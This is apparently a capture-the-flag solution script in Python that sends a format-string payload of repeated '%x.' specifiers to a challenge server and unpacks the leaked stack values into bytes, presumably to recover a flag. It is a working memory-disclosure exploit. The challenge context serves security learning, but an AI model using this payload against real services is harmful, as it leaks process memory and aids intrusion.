# Solution without importing pwn (pwntools) lib

import requests

BASE_16: int = 16

def p32(value) -> bytes:
    # Pack a 32-bit integer into a little-endian byte string
    return value.to_bytes(4, byteorder='little')

def main() -> None:
    response = requests.post(
        url = 'http://mmc-challenges.cyber.org.il:12345',
        data = {
            "input" : '%x.' * 100 + "%x",
        },
    )
    
    # print(response.text)
    
    print(
        [p32(int(x, BASE_16)) for x in response.text.split(".")]
    )

if __name__ == "__main__":
    main()
